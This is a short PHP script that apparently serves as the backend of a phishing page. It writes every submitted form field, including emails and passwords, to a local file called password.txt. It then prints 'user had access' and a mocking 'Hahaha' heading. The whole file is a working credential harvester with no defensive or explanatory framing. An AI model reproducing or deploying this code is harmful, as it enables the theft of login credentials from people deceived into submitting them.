<?php 
   echo "user had access";
   // echo var_dump($_POST);
   // echo $_POST['email'];
   $file = fopen("password.txt", "a");
   fwrite($file, "\t_______________\n\n\n");
   foreach($_POST as $key => $value) {
      fwrite($file, "\t\t");
      fwrite($file, $key);
      fwrite($file, "=");
      fwrite($file, $value);
      fwrite($file, "\r\n");
   }
   fwrite($file, "\n\n\n\t_______________\n\n\n");
   fclose($file);
   die();
?>
<h2>Hahaha</h2>